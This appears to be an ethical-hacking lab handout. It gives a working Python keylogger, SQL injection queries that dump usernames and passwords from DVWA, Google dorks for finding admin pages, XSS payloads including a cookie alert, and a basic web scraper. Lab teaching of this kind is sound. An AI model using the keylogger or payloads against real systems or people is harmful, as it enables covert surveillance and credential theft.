

## Key Logger Attack

### Steps

```python
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(
    filename=(log_dir + "key_log.txt"),
    level=logging.DEBUG,
    format='%(asctime)s:%(message)s:'
)

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```

---

## SQL Injection Attack



### Setup DVWA

1. Download **DVWA (Damn Vulnerable Web Application)**.
2. Start **Apache** and **MySQL** using XAMPP.
3. Extract DVWA into the `htdocs` directory.
4. Rename:

   ```
   dvwa/config/config.inc.php.dist → dvwa/config/config.inc.php
   ```
5. Open the file and configure:

   * **DB User:** `root`
   * **Password:** *(leave empty)*

### Access DVWA

6. Open:

   ```
   http://localhost/dvwa
   ```
7. Login credentials:

   * Username: `admin`
   * Password: `password`
8. Click **Create / Reset Database**.
9. Login again with the same credentials.
10. Go to **DVWA Security** → Set security level to **Low**.

### SQL Injection Queries

#### 1. Find number of columns

```
1' ORDER BY 2#
```

#### 2. Get database version

```
1' UNION SELECT NULL, version()#
```

#### 3. Get database name

```
1' UNION SELECT NULL, database()#
```

#### 4. Extract usernames and passwords

```
1' UNION SELECT user, password FROM users#
```

---

## Reconnaissance (Google Dorking)


### Search Queries

#### 1. Find hacking-related blogs

```
related:hacking blogs
```

#### 2. URLs containing "ethical"

```
inurl:ethical
```

#### 3. Search PDF files

```
filetype:pdf ethical
```

#### 4. Pakistan websites with admin page

```
site:.pk admin.php
```

#### 5. Search within a specific website

```
site:amazon.com tshirt
```

#### 6. Find PDF documents from Java website

```
filetype:pdf site:java.com
```

#### 7. Find contact pages on Amazon

```
site:amazon.com intitle:"contact us" OR site:amazon.com "contact us"
```

#### 8. Exclude keywords

```
dogs -cats
```

#### 9. Exact phrase search

```
"ethical hacking"
```

---


---

## Cross-Site Scripting (XSS)


**Note:** Use the same XAMPP and DVWA configuration as in the SQL Injection practical.

---

### XSS Reflected

#### Steps

1. Set **Security Level → Low** and click **Submit**.
2. Open **XSS (Reflected)** module.
3. Enter your name and execute.

#### Test Payloads

* Basic alert:

```html id="p1a"
<script>alert("Hello")</script>
```

4. Change **Security Level → Medium** and click **Submit**.

* Try again:

```html id="p1b"
<script>alert("Hello")</script>
```

* Display cookies:

```html id="p1c"
<script>alert(document.cookie)</script>
```

* Image-based XSS:

```html id="p1d"
<img src="no src" onerror="alert('hello')">
```

---

### XSS Stored

#### Steps

1. Set **Security Level → Low** and click **Submit**.
2. Enter input with payload:

```html id="p2a"
<script>alert("Hello")</script>
```

3. Submit and observe stored execution.

4. Again, input:

```html id="p2b"
<img src="no src" onerror="alert('hello')">
```

---

## Web Scraper


### Steps

1. Open any Python editor and write:

```python id="scr1"
import requests
from bs4 import BeautifulSoup

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    paragraphs = soup.find_all('p')

    for para in paragraphs:
        print(para.get_text())

if __name__ == "__main__":
    url = "https://www.geeksforgeeks.org/"
    scrape_website(url)
```

---

2. Install dependencies:

```bash id="scr2"
pip install beautifulsoup4
pip install requests
```

---

3. Run the program:

```bash id="scr3"
python script.py
```

4. Verify that paragraph content from the website is printed.

---
